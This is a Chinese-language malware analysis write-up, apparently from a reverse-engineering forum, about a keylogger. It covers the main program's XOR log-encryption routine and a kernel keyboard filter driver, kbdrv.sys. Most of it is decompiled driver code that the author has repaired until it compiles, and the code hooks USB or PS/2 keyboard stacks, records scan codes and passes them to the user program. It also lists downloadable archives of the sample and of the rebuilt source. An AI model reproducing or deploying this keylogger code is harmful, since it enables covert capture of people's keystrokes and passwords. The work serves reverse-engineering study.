3、加密字符集：byte\_404018 db 0Eh, 2, 6, 5Eh, 1, 9, 3, 7, 8, 0Fh  
\---------------------------------------------------------------------------------------------------------  
004015A9  push    ebp  
004015AA  mov     ebp, esp  
004015AC  push    -1  
004015AE  push    0040265D                            ;  SE 处理程序安装  
004015B3  mov     eax, dword ptr fs:\[0\]  
004015B9  push    eax  
004015BA  mov     dword ptr fs:\[0\], esp  
004015C1  sub     esp, 36C  
004015C7  push    esi  
004015C8  push    1  
004015CA  lea     ecx, dword ptr \[ebp-170\]  
004015D0  call    dword ptr \[<&MSVCIRT.fstream::fstre>;  定义流文件对象  
004015D6  mov     dword ptr \[ebp-4\], 0  
004015DD  mov     eax, dword ptr \[ebp+8\]  
004015E0  push    eax                                 ; /src 参数传入的字串  
004015E1  lea     ecx, dword ptr \[ebp-378\]            ; |  
004015E7  push    ecx                                 ; |dest  
004015E8  call    <jmp.&MSVCRT.strcpy>                ; \\strcpy  
004015ED  add     esp, 8  
004015F0  lea     edx, dword ptr \[ebp-378\]  
004015F6  push    edx                                 ; /s  
004015F7  call    <jmp.&MSVCRT.strlen>                ; \\strlen 得到传入字串长度  
004015FC  add     esp, 4  
004015FF  mov     dword ptr \[ebp-178\], eax            ;保存长度  
00401605  mov     dword ptr \[ebp-174\], 0  
0040160F  jmp     short 00401620  
00401611  /mov     eax, dword ptr \[ebp-174\]             
00401617  |add     eax, 1                               
0040161A  |mov     dword ptr \[ebp-174\], eax           ;;dword ptr \[ebp-174\] ++  
00401620   mov     ecx, dword ptr \[ebp-174\]  
00401626  |cmp     ecx, dword ptr \[ebp-178\]  
0040162C  |jge     short 00401683                     ;处理过的字符数量如果超过了传入字串的长度则跳转  
0040162E  |mov     edx, dword ptr \[ebp-174\]  
00401634  |movsx   ecx, byte ptr \[ebp+edx-378\]  
0040163C  |mov     eax, dword ptr \[404768\]  
00401641  |cdq  
00401642  |mov     esi, 0A  
00401647  |idiv    esi                                ;模运算: dword ptr \[404768\] % 10，结果存 edx  
00401649  |movsx   edx, byte ptr \[edx+404018\]  
00401650  |xor     ecx, edx                           ;异或运算：传入串的第 dword ptr \[ebp-174\]个值^ptr \[404018\]第 edx 个值  
00401652  |mov     eax, dword ptr \[ebp-174\]  
00401658  |mov     byte ptr \[ebp+eax-378\], cl         ;异或运算结果存回： 传入串的第 dword ptr \[ebp-174\]个值   
0040165F  |mov     ecx, dword ptr \[404768\]  
00401665  |add     ecx, 1                               
00401668  |mov     dword ptr \[404768\], ecx            ;dword ptr \[404768\] ++  
0040166E  |cmp     dword ptr \[404768\], 9  
00401675  |jle     short 00401681                     ;如果 dword  ptr \[404768\]的值小于等于 9 则跳转  
00401677  |mov     dword ptr \[404768\], 0  
00401681  \\jmp     short 00401611  
00401683  mov     edx, dword ptr \[ebp+C\]  
00401686  push    edx                                 ; /src  
00401687  lea     eax, dword ptr \[ebp-10C\]            ; |  
0040168D  push    eax                                 ; |dest  
0040168E  call    <jmp.&MSVCRT.strcpy>                ; \\strcpy 复制传入的字串  
00401693  add     esp, 8  
00401696  mov     ecx, dword ptr \[<&MSVCIRT.filebuf::>;  MSVCIRT.filebuf::openprot  
0040169C  mov     edx, dword ptr \[ecx\]  
0040169E  push    edx  
0040169F  push    8A  
004016A4  lea     eax, dword ptr \[ebp-10C\]  
004016AA  push    eax  
004016AB  lea     ecx, dword ptr \[ebp-170\]  
004016B1  call    dword ptr \[<&MSVCIRT.fstream::open>>;  MSVCIRT.fstream::open 创建文件对象，名字为传入的字串  
004016B7  mov     ecx, dword ptr \[ebp-170\]  
004016BD  mov     edx, dword ptr \[ecx+4\]  
004016C0  lea     ecx, dword ptr \[ebp+edx-170\]  
004016C7  call    dword ptr \[<&MSVCIRT.ios::fail>\]    ;  MSVCIRT.ios::fail  
004016CD  test    eax, eax  
004016CF  jnz     short 004016F7                      ;如果创建失败则跳转  
004016D1  mov     eax, dword ptr \[ebp-178\]  
004016D7  push    eax  
004016D8  lea     ecx, dword ptr \[ebp-378\]  
004016DE  push    ecx  
004016DF  lea     ecx, dword ptr \[ebp-164\]  
004016E5  call    dword ptr \[<&MSVCIRT.ostream::write>;  MSVCIRT.ostream::write 把传入的字串写入文件  
004016EB  lea     ecx, dword ptr \[ebp-170\]  
004016F1  call    dword ptr \[<&MSVCIRT.fstream::close>;  MSVCIRT.fstream::close 关闭文件  
004016F7  mov     dword ptr \[ebp-4\], -1  
004016FE  lea     ecx, dword ptr \[ebp-170\]  
00401704  call    dword ptr \[<&MSVCIRT.fstream::\`vbas>;  MSVCIRT.fstream::\`vbase destructor'释放文件对象  
0040170A  mov     ecx, dword ptr \[ebp-C\]  
0040170D  mov     dword ptr fs:\[0\], ecx  
00401714  pop     esi  
00401715  mov     esp, ebp  
00401717  pop     ebp  
00401718  retn  
\---------------------------------------------------------------------------------------------------------  
键盘过滤驱动 kbdrv.sys 基本流程：  
    1、检测键盘类型  
    调用 ObReferenceObjectByName 函数取得\\Driver\\hidusb 的驱动对象，遍历其设备链的设备  
栈如找到设备的驱动名字 Driver\\kbdhid，则键盘为 USB 类型，否则为 PS/2 类型。  
    2、绑定键盘过滤驱动  
对于 USB 类型设备建立名字为\\\\Device\\\\kbdev 的设备，对于 PS/2 类型设备建立名字为  
\\\\Device\\\\KeyboardClass0 的设备，通过 IoAttachDeviceToDeviceStack，绑定建立的设备到相  
应的设备栈。  
    3、设置 IRP 回调函数  
设置 IRP\_MJ\_READ，IRP\_MJ\_CREATE，IRP\_MJ\_DEVICE\_CONTROL 功能代码的三个回调函数。  
   
**四、驱动逆向：**  
   
    对照上文驱动流程并参考 kbdrv.idb 中对驱动汇编代码的详细注释，应该可以很容易理解此  
驱动 程序的流程，此处整理一下驱动与应用程序进行交互主要内容：  
    应用程序通过调用 DeviceIoControl 函数向驱动请求数据、该函数使用过的控制代码参数包  
括：0x80102180，0x80102184，0x80102187，在驱动程序中由 IRP\_MJ\_DEVICE\_CONTROL 的回调函  
数来处理应用程序发来的数据请求，对应关系如下：  
   
  控制码                    应用程序                                       驱动程序  
\----------------------------------------------------------------------------------------------------------         
0x80102180：传递来的缓冲区数据已处理完毕，请求驱动清缓冲区     驱动按键盘扫描码的缓冲区清 0，记数器清 0。  
0x80102184：前端窗口已改变，请求该窗口改变前的所有键盘输入     将扫描码的缓冲区数据传递给应用程序。  
0x80102187：前端窗口中的控件失去输入焦点，请求记录中加换行符   向扫描码的缓冲区中添加换行符号。  
\----------------------------------------------------------------------------------------------------------         
   
下面我们关注：hexrays 逆向出来的伪代码可以编译吗？  
   
使用 IDA 打开 kbdrv.sys，直接用 ctrl+F5 生成 kbdrv.sys 的伪代码，保存为 kbdrv01.c;对  
kbdrv01.c 做如下修正：  
    1、#include <windows.h>替换为#include <ntddk.h>、添加#include <string.h>  
    2、主函数修改为标准的驱动入口函数形式:NTSTATUS \_\_stdcall DriverEntry  
(PDRIVER\_OBJECT DriverObject, PUNICODE\_STRING RegistryPath)  
    3、对照汇编检查全局变量，使汇编与伪代码的全局变量定义及初试化保持一致。  
    4、取消未公开函数的注释，使函数 ObReferenceObjectByName 和数据 IoDriverObjectType  
定义生效。  
    5、入口函数内 const WCHAR SourceString 重定义为 const WCHAR SourceString\[512\] =   
{0}；并修改该变量使用方式。  
    6、修改入口函数内 memset((char \*)DriverObject + 56, (int )sub\_1088E, 0x6Cu);写  
法。(sub\_1088E 的强制转换编译器无法识别)  
    7、修改\_IO\_STACK\_LOCATION 结构定义使编译器能够识别。  
    8、注释掉无效操作部分 v7 = \_\_SETO\_\_(dword\_10980 + 1, 512);根据汇编码重写。  
   
    完成以上修改(见 kbdrv01 目录)，伪代码即可编译(windows2000/ddk)，将生成的 kbdrv.sys  
替换掉主程序编译环境的中的 kbdrv.dat,测试执行编译后的 kblog.exe 能否正确记录按键输入即  
可验证全部逆向代码正确与否。  
   
说明：  
    伪代码中头文件 defs.h 来自 ida 的 plugins 目录，保留此文件对部分数据结构的定义会导致  
编译时数据类型不一致的警告，但不影响编译结果,可以通过编译前后的的汇编代码对比来验  
证。  
   
    对 hexray 逆向的伪代码进行编译的意义在于，当我们还不是很清楚反汇编代码的含义时，  
可以先在伪代码中嵌入调试信息，进行调试，以加快代码逆向进度；或者只对我们感兴趣的代  
码部分进行改动、添加等。  
   
部分代码修正分析：  
   
    1、入口函数前三行代码：  
    SourceString = 0;    
    memset(&v8, 0, 0x3FCu);  
    v9 = 0;  
    其变量定义为：  
    const WCHAR SourceString; // \[sp+Ch\] \[bp-420h\]@1  
    char v8; // \[sp+Eh\] \[bp-41Eh\]@1  
    \_\_int16 v9; // \[sp+40Ah\] \[bp-22h\]@1  
    没有对 v8 分配过空间就进行初试化明显会破坏堆栈，而且奇怪的是做此初试化后，后续代   
码并没有对 v8,v9 做任何引用，看定义中的堆栈位置的注释可知此三个变量在堆栈中排列是连续  
的，其大小为(bp-420h)-(bp-22h)+2 = 400h bytes，可以判断此空间应为 SourceString 所拥  
有，根据汇编代码中的情形，在伪代码中我们可以去掉 v8,v9，修正 SourceString 的定义：  
  const WCHAR SourceString\[512\] = {0}；  
   
    2、入口函数中 memset((char \*)DriverObject + 56, (int )sub\_1088E, 0x6Cu)语句在编  
译时因无法识别函数 sub\_1088E 地址导致内部编译错误，查：DriverObject 结构偏移 56 处为分派  
例程序地址表，27 个分派例程占用 0x6C 字节空间，所以此处改为驱动程序规范写法：   
   for(i = 0; i < 27; i++)  
      DriverObject->MajorFunction\[i\] = sub\_1088E;  
    3、伪代码函数 KeyboardRecord 中出现 v7 = \_\_SETO\_\_(dword\_10980 + 1, 512)，  
查：defs.h 中定义 define \_\_SETO\_\_(x, y)   invalid\_operation，此处伪代码标识为为无效操  
作：数组元素数量越限。根据原汇编代码含义做相应修正：  
   dword\_10980++；  
   if(dword\_10980>=512) dword\_10980 = 0;  
   
    为提高 hexrays 逆向代码的可读性，下面我们对 IDA 反汇编代码中使用的所有变量及其偏移  
都尽可能在理解的基础上逆向为恰当的数据结构，数据结构都取自 IDA 的标准库(Structures-  
\>Create Structre/union->Add standard structure)；对于函数名称、数据定义名字等也根据  
对程序的理解重新命名；在此基础上重复上文所述对伪代码的修正，我们可以得到以下可读性  
较好的源代码，保存为 kbdrv02.c。  
   
以下为可编译的伪代码：  
//-------------------------------------------------------------------------  
/\* This file has been generated by the Hex-Rays decompiler.  
   Copyright (c) 2007 Hex-Rays sprl <info@hex-rays.com>  
   Detected compiler: Visual C++  
\*/  
#include <ntddk.h>  
#include <defs.h>  
#include <string.h>  
#define KDBDEVICENAME L"\\\\Driver\\\\kbdhid"    
#define USBKEYBOARDNAME L"\\\\Driver\\\\hidusb"    
#define NT\_DEVICE\_NAME L"\\\\Device\\\\kbdev"          
//-------------------------------------------------------------------------  
// Data declarations  
//extern const WCHAR SourceString\[\]; // idb  
//extern const WCHAR aDeviceKbdev\[\]; // idb  
//extern const WCHAR aDosdevicesKbde\[\]; // idb  
//extern wchar\_t KDBDEVICENAME; // idb  
//extern wchar\_t word\_103F2; // idb  
//extern const WCHAR hidusb; // idb  
//extern const WCHAR aDeviceKbdev\_0\[\]; // idb  
//extern const WCHAR NT\_DEVICE\_NAME; // idb  
//void \*IoDriverObjectType; //weak  
extern void \*IoDriverObjectType; //weak  
int HitCount; // weak  
\_\_int16 KeyBuffer\[1024\]; // idb  
//-------------------------------------------------------------------------  
// Function declarations  
int \_\_stdcall DriverEntry(PDRIVER\_OBJECT DriverObject, PUNICODE\_STRING RegistryPath); // idb  
char \_\_stdcall GetAttachedDeviceInfo(PDEVICE\_OBJECT DeviceObject); // idb  
signed int \_\_stdcall GetUsbKeybordDevice(PDEVICE\_OBJECT \*UsbDeviceObject); // idb  
NTSTATUS \_\_stdcall AttachUSBKeyboardDevice(PDEVICE\_OBJECT TargetDevice, PDRIVER\_OBJECT DriverObject); // idb  
NTSTATUS \_\_stdcall AttachPS2KeyBoardDevice(PUNICODE\_STRING SourceDevice, PDRIVER\_OBJECT DriverObject, PDRIVER\_OBJECT \*ReturnDriverObject); // idb  
int \_\_stdcall DispatchKeyBoardRead(PDEVICE\_OBJECT DeviceObject, PIRP Irp); // idb  
int \_\_stdcall KeyboardRecord(PDEVICE\_OBJECT DeviceObject, PIRP Irp, PVOID Context); // idb  
int \_\_stdcall DispatchIoControl(PDEVICE\_OBJECT DeviceObject, PIRP irp); // idb  
int \_\_stdcall DispatchCreate(PDEVICE\_OBJECT DeviceObject, PIRP Irp); // idb  
NTSTATUS \_\_stdcall PassCurrentIRP(PDEVICE\_OBJECT DeviceObject, PIRP Irp); // idb  
int \_\_stdcall ObReferenceObjectByName(\_DWORD, \_DWORD, \_DWORD, \_DWORD, \_DWORD, \_DWORD, \_DWORD, \_DWORD); //weak  
//----- (000102F0) --------------------------------------------------------  
int \_\_stdcall DriverEntry(PDRIVER\_OBJECT DriverObject, PUNICODE\_STRING RegistryPath)  
{  
  PDRIVER\_OBJECT v2; // ebx@3  
  void (\_\_stdcall \*v3)(PUNICODE\_STRING, PCWSTR); // esi@3  
  int result; // eax@4  
  struct \_DRIVER\_OBJECT \*v5; // ST08\_4@3  
  struct \_DEVICE\_OBJECT \*v6; // ST04\_4@3  
  //const WCHAR SourceString; // \[sp+Ch\] \[bp-420h\]@1  
  const WCHAR SourceString\[512\] = {0};  
  //char v8; // \[sp+Eh\] \[bp-41Eh\]@1  
  //\_\_int16 v9; // \[sp+40Ah\] \[bp-22h\]@1  
  PDEVICE\_OBJECT UsbDeviceObject; // \[sp+428h\] \[bp-4h\]@1  
  UNICODE\_STRING DestinationString; // \[sp+41Ch\] \[bp-10h\]@3  
  int KeyDriver; // \[sp+424h\] \[bp-8h\]@6  
  UNICODE\_STRING DeviceName; // \[sp+40Ch\] \[bp-20h\]@8  
  UNICODE\_STRING SymbolicLinkName; // \[sp+414h\] \[bp-18h\]@8  
  int i;  
  //SourceString = 0;  
  //memset(&v8, 0, 0x3FCu);  
  //v9 = 0;  
  if ( GetUsbKeybordDevice(&UsbDeviceObject) >= 0 && UsbDeviceObject )  
  {  
    v3 = RtlInitUnicodeString;  
    //RtlInitUnicodeString(&DestinationString, &SourceString);  
    RtlInitUnicodeString(&DestinationString, SourceString);  
    v2 = DriverObject;  
    v5 = DriverObject;  
    v6 = UsbDeviceObject;  
    //memset((char \*)DriverObject + 56, (int)PassCurrentIRP, 0x6Cu);  
    for(i = 0; i < 27; i++)  
      DriverObject->MajorFunction\[i\] = PassCurrentIRP;  
    if ( AttachUSBKeyboardDevice(v6, v5) < 0 )  
      return STATUS\_INSUFFICIENT\_RESOURCES;  
  }  
  else  
  {  
    v3 = RtlInitUnicodeString;  
    RtlInitUnicodeString(&DestinationString, L"\\\\Device\\\\KeyboardClass0");  
    v2 = DriverObject;  
    if ( AttachPS2KeyBoardDevice(&DestinationString, DriverObject, (PDRIVER\_OBJECT \*)&KeyDriver) < 0 || !KeyDriver )  
      return STATUS\_INSUFFICIENT\_RESOURCES;  
  }  
  ((int (\_\_stdcall \*)(UNICODE\_STRING \*, const WCHAR \*))v3)(&DeviceName, L"\\\\Device\\\\kbdev");  
  ((int (\_\_stdcall \*)(UNICODE\_STRING \*, const WCHAR \*))v3)(&SymbolicLinkName, L"\\\\DosDevices\\\\kbdev");  
  result = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);  
  if ( result >= 0 )  
  {  
    v2->MajorFunction\[3\] = (PDRIVER\_DISPATCH)DispatchKeyBoardRead;  
    v2->MajorFunction\[0\] = (PDRIVER\_DISPATCH)DispatchCreate;  
    v2->MajorFunction\[14\] = (PDRIVER\_DISPATCH)DispatchIoControl;  
    result = 0;  
  }  
  return result;  
}  
//----- (00010410) --------------------------------------------------------  
char \_\_stdcall GetAttachedDeviceInfo(PDEVICE\_OBJECT DeviceObject)  
{  
  char v1; // bl@1  
  char result; // al@2  
  struct \_DEVICE\_OBJECT \*v3; // esi@3  
  size\_t v4; // eax@6  
  v1 = 0;  
  if ( DeviceObject )  
  {  
    v3 = DeviceObject->AttachedDevice;  
    while ( v3 )  
    {  
      if ( MmIsAddressValid(v3->DriverObject->DriverName.Buffer) )  
      {  
        //v4 = wcslen(&KDBDEVICENAME);  
        v4 = wcslen(KDBDEVICENAME);  
        //if ( !\_wcsnicmp(v3->DriverObject->DriverName.Buffer, &word\_103F2, v4) )  
        if ( !\_wcsnicmp(v3->DriverObject->DriverName.Buffer, KDBDEVICENAME, v4) )  
        {  
          v1 = 1;  
          break;  
        }  
      }  
      v3 = v3->AttachedDevice;  
    }  
    result = v1;  
  }  
  else  
  {  
    result = 0;  
  }  
  return result;  
}  
//----- (00010488) --------------------------------------------------------  
signed int \_\_stdcall GetUsbKeybordDevice(PDEVICE\_OBJECT \*UsbDeviceObject)  
{  
  signed int result; // eax@2  
  int v2; // esi@3  
  int DriverObject; // \[sp+Ch\] \[bp-4h\]@1  
  UNICODE\_STRING DestinationString; // \[sp+4h\] \[bp-Ch\]@1  
  DriverObject = 0;  
  //RtlInitUnicodeString(&DestinationString, &hidusb);  
  RtlInitUnicodeString(&DestinationString, USBKEYBOARDNAME);  
  ObReferenceObjectByName(&DestinationString, 64, 0, 0, IoDriverObjectType, 0, 0, &DriverObject);  
  if ( DriverObject )  
  {  
    v2 = \*(\_DWORD \*)(DriverObject + 4);  
    while ( v2 )  
    {  
      if ( \*(\_DWORD \*)(v2 + 16) && GetAttachedDeviceInfo((PDEVICE\_OBJECT)v2) )  
      {  
        \*UsbDeviceObject = (PDEVICE\_OBJECT)v2;  
        goto LABEL\_10;  
      }  
      v2 = \*(\_DWORD \*)(v2 + 12);  
    }  
    \*UsbDeviceObject = 0;  
LABEL\_10:  
    result = 0;  
  }  
  else  
  {  
    result = STATUS\_UNSUCCESSFUL;  
  }  
  return result;  
}  
//----- (00010518) --------------------------------------------------------  
NTSTATUS \_\_stdcall AttachUSBKeyboardDevice(PDEVICE\_OBJECT TargetDevice, PDRIVER\_OBJECT DriverObject)  
{  
  NTSTATUS result; // eax@1  
  PDEVICE\_OBJECT v3; // eax@2  
  PVOID v4; // esi@2  
  struct \_DEVICE\_OBJECT \*v5; // ST18\_4@2  
  PDEVICE\_OBJECT v6; // ecx@4  
  UNICODE\_STRING DestinationString; // \[sp+4h\] \[bp-Ch\]@1  
  PDEVICE\_OBJECT DeviceObject; // \[sp+Ch\] \[bp-4h\]@1  
  RtlInitUnicodeString(&DestinationString, L"\\\\Device\\\\kbdev");  
  result = IoCreateDevice(DriverObject, 0x18u, &DestinationString, 0x22u, 0, 0, &DeviceObject);  
  if ( result >= 0 )  
  {  
    v4 = DeviceObject->DeviceExtension;  
    KeInitializeSpinLock((PKSPIN\_LOCK)v4 + 5);  
    v5 = TargetDevice;  
    \*((\_DWORD \*)v4 + 4) = 0;  
    v3 = IoAttachDeviceToDeviceStack(DeviceObject, v5);  
    if ( v3 )  
    {  
      v6 = DeviceObject;  
      \*((\_DWORD \*)v4 + 1) = v3;  
      \*(\_DWORD \*)v4 = v6;  
      LOWORD(DeviceObject->Flags) |= 0x2004u;  
      LOBYTE(DeviceObject->Flags) &= 0x7Fu;  
      result = 0;  
    }  
    else  
    {  
      IoDeleteDevice(DeviceObject);  
      result = STATUS\_INSUFFICIENT\_RESOURCES;  
    }  
  }  
  return result;  
}  
//----- (000105BA) --------------------------------------------------------  
NTSTATUS \_\_stdcall AttachPS2KeyBoardDevice(PUNICODE\_STRING SourceDevice, PDRIVER\_OBJECT DriverObject, PDRIVER\_OBJECT \*ReturnDriverObject)  
{  
  NTSTATUS result; // eax@1  
  NTSTATUS v4; // eax@2  
  NTSTATUS v5; // esi@3  
  PDEVICE\_OBJECT v6; // eax@4  
  int v7; // esi@4  
  PUNICODE\_STRING v8; // ecx@6  
  PFILE\_OBJECT FileObject; // \[sp+10h\] \[bp-4h\]@1  
  PDEVICE\_OBJECT TargetDevice; // \[sp+Ch\] \[bp-8h\]@1  
  UNICODE\_STRING DestinationString; // \[sp+4h\] \[bp-10h\]@2  
  result = IoGetDeviceObjectPointer(SourceDevice, 0x1F01FFu, &FileObject, &TargetDevice);  
  if ( result >= 0 )  
  {  
    RtlInitUnicodeString(&DestinationString, NT\_DEVICE\_NAME);  
    v4 = IoCreateDevice(DriverObject, 0x18u, &DestinationString, 0xBu, 0, 0, (PDEVICE\_OBJECT \*)&SourceDevice);  
    if ( v4 >= 0 )  
    {  
      v7 = \*(\_DWORD \*)&SourceDevice\[5\].Length;  
      KeInitializeSpinLock((PKSPIN\_LOCK)(v7 + 20));  
      \*(\_DWORD \*)(v7 + 16) = 0;  
      v6 = IoAttachDeviceToDeviceStack((PDEVICE\_OBJECT)SourceDevice, TargetDevice);  
      if ( !v6 )  
      {  
        ObfDereferenceObject(FileObject);  
        IoDeleteDevice((PDEVICE\_OBJECT)SourceDevice);  
        return STATUS\_INSUFFICIENT\_RESOURCES;  
      }  
      v8 = SourceDevice;  
      \*(\_DWORD \*)(v7 + 4) = v6;  
      \*(\_DWORD \*)v7 = v8;  
      \*(\_DWORD \*)(v7 + 8) = FileObject;  
      SourceDevice\[5\].Buffer = (PWSTR)v6->DeviceType;  
      \*(\_DWORD \*)&SourceDevice\[4\].Length = v6->Characteristics;  
      LOBYTE(SourceDevice\[3\].Buffer) &= 0x7Fu;  
      SourceDevice\[3\].Buffer = (PWSTR)((unsigned int)SourceDevice\[3\].Buffer | v6->Flags & 0x14);  
      v5 = 0;  
      \*ReturnDriverObject = v6->DriverObject;  
    }  
    else  
    {  
      v5 = v4;  
    }  
    ObfDereferenceObject(FileObject);  
    result = v5;  
  }  
  return result;  
}  
//----- (0001069A) --------------------------------------------------------  
int \_\_stdcall DispatchKeyBoardRead(PDEVICE\_OBJECT DeviceObject, PIRP Irp)  
{  
  PVOID v3; // ebx@1  
  //struct \_IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::\_IO\_STACK\_LOCATION \*v4; // esi@1  
  struct \_IO\_STACK\_LOCATION \*v4; // esi@1  
  struct \_IRP \*v5; // edx@1  
  PDEVICE\_OBJECT v6; // ecx@1  
  //struct \_IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::\_IO\_STACK\_LOCATION \*v7; // eax@1  
  struct \_IO\_STACK\_LOCATION \*v7; // eax@1  
  KIRQL NewIrql; // \[sp+Fh\] \[bp-1h\]@1  
  v3 = DeviceObject->DeviceExtension;  
  v4 = Irp->Tail.Overlay.CurrentStackLocation;  
  memcpy((char \*)v4 - 36, v4, 0x1Cu);  
  \*((\_BYTE \*)v4 - 33) = 0;  
  NewIrql = KfAcquireSpinLock((PKSPIN\_LOCK)v3 + 5);  
  InterlockedIncrement((volatile LONG \*)v3 + 4);  
  KfReleaseSpinLock((PKSPIN\_LOCK)v3 + 5, NewIrql);  
  v5 = Irp;  
  v6 = DeviceObject;  
  v7 = Irp->Tail.Overlay.CurrentStackLocation;  
  \*((\_DWORD \*)v7 - 2) = KeyboardRecord;  
  //v7 = (struct \_IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::\_IO\_STACK\_LOCATION \*)((char \*)v7 - 36);  
  v7 = (struct \_IO\_STACK\_LOCATION \*)((char \*)v7 - 36);  
  \*((\_DWORD \*)v7 + 8) = v6;  
  \*((\_BYTE \*)v7 + 3) = -32;  
  return IofCallDriver(\*((PDEVICE\_OBJECT \*)v3 + 1), v5);  
}  
//----- (00010708) --------------------------------------------------------  
int \_\_stdcall KeyboardRecord(PDEVICE\_OBJECT DeviceObject, PIRP Irp, PVOID Context)  
{  
  PVOID v3; // ebx@1  
  PIRP v4; // esi@1  
  struct \_IRP \*v5; // ecx@2  
  unsigned \_\_int8 v7; // of@5  
  char v8; // sf@5  
  \_\_int16 v9; // cx@9  
  v4 = Irp;  
  v3 = DeviceObject->DeviceExtension;  
  if ( !Irp->IoStatus.Status )  
  {  
    v5 = Irp->AssociatedIrp.MasterIrp;  
    if ( v5 )  
    {  
      if ( (signed int)(Irp->IoStatus.Information / 0xC) >= 0 )  
      {  
        if ( !LOWORD(v5->MdlAddress) )  
        {  
          KeyBuffer\[HitCount\] = v5->Size;  
          //v7 = \_\_SETO\_\_(HitCount + 1, 512);  
          //v8 = HitCount++ < 511;  
          //if ( !(v8 ^ v7) )  
            //HitCount = 0;  
    HitCount++;  
    if(HitCount>=512) HitCount = 0;  
        }  
        if ( LOWORD(v5->MdlAddress) == 1 )  
        {  
          if ( !HitCount )  
          {  
            v9 = v5->Size;  
            HitCount = 1;  
            KeyBuffer\[0\] = v9;  
          }  
        }  
      }  
    }  
  }  
  if ( v4->PendingReturned )  
    \*((\_BYTE \*)v4->Tail.Overlay.CurrentStackLocation + 3) |= 1u;  
  HIBYTE(DeviceObject->Size) = KfAcquireSpinLock((PKSPIN\_LOCK)v3 + 5);  
  InterlockedDecrement((volatile LONG \*)v3 + 4);  
  KfReleaseSpinLock((PKSPIN\_LOCK)v3 + 5, HIBYTE(DeviceObject->Size));  
  return v4->IoStatus.Status;  
}  
//----- (000107BA) --------------------------------------------------------  
int \_\_stdcall DispatchIoControl(PDEVICE\_OBJECT DeviceObject, PIRP irp)  
{  
  signed int v2; // eax@1  
  unsigned int v3; // edx@1  
  PIRP v4; // ebx@1  
  int v5; // esi@1  
  //struct \_IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::\_IO\_STACK\_LOCATION \*v7; // eax@1  
  struct \_IO\_STACK\_LOCATION \*v7; // eax@1  
  int v8; // eax@7  
  v4 = irp;  
  v5 = 0;  
  v7 = irp->Tail.Overlay.CurrentStackLocation;  
  v3 = \*((\_DWORD \*)v7 + 1);  
  v2 = \*((\_DWORD \*)v7 + 3);  
  if ( v2 != 0xB0008 )  
  {  
    if ( v2 == 0x80102180 )  
    {  
      HitCount = 0;  
      memset(KeyBuffer, 0, 0x400u);  
    }  
    else  
    {  
      if ( v2 == 0x80102184 )  
      {  
        memcpy(irp->AssociatedIrp.MasterIrp, KeyBuffer, v3);  
        v5 = 0;  
        v4->IoStatus.Information = v3;  
        v4->IoStatus.Status = 0;  
LABEL\_12:  
        IofCompleteRequest(v4, 0);  
        return v5;  
      }  
      if ( v2 == 0x80102187 )  
      {  
        if ( HitCount )  
        {  
          KeyBuffer\[HitCount\] = 0xEEu;  
          v8 = HitCount++ + 1;  
          if ( v8 >= (signed int)0x200u )  
            HitCount = 0;  
        }  
      }  
      else  
      {  
        v5 = 0xC0000010u;  
      }  
    }  
    v4->IoStatus.Information = 0;  
    goto LABEL\_12;  
  }  
  return PassCurrentIRP(DeviceObject, irp);  
}  
//----- (00010874) --------------------------------------------------------  
int \_\_stdcall DispatchCreate(PDEVICE\_OBJECT DeviceObject, PIRP Irp)  
{  
  Irp->IoStatus.Status = 0;  
  Irp->IoStatus.Information = 0;  
  IofCompleteRequest(Irp, 0);  
  return 0;  
}  
//----- (0001088E) --------------------------------------------------------  
NTSTATUS \_\_stdcall PassCurrentIRP(PDEVICE\_OBJECT DeviceObject, PIRP Irp)  
{  
  PDEVICE\_OBJECT v3; // eax@1  
  v3 = DeviceObject;  
  ++Irp->CurrentLocation;  
  //Irp->Tail.Overlay.CurrentStackLocation = (struct \_IRP::$::$::$::$A02EC6A2CE86544F716F4825015773AC::\_IO\_STACK\_LOCATION \*)((char \*)Irp->Tail.Overlay.CurrentStackLocation + 36);  
  Irp->Tail.Overlay.CurrentStackLocation = (struct \_IO\_STACK\_LOCATION \*)((char \*)Irp->Tail.Overlay.CurrentStackLocation + 36);  
  return IofCallDriver(\*((PDEVICE\_OBJECT \*)v3->DeviceExtension + 1), Irp);  
}  
// ALL OK, 10 function(s) have been successfully decompiled  
   
    以上代码虽可编译，但仍有很多中间变量，宏替换代码等，进一步优化即可得到一份符合  
驱动程序编写规范的源代码，留给有兴趣的朋友完成。  
   
                      
  
  
样本.rar \[解压密码：PEDIY\]  
Fuzen.rar --------Fuzen 的开源代码，msdtx.sys 来自这里  
KBLOG\_C.rar --------主程序逆向的 C 代码 VC6.0 编译通过 \[解压密码：pediy\]   
KBDRV\_C.rar --------hexrays 逆向出来的伪代码，win2k 下 ddk 编译通过  
KBDRV\_IDB.rar --------驱动的 IDA 保存文件，汇编代码详细注释 \[解压密码：pediy\]   
部分汇编代码注释.txt --------主程序重点汇编代码注释  
  
  
   
                                                                   bambooooo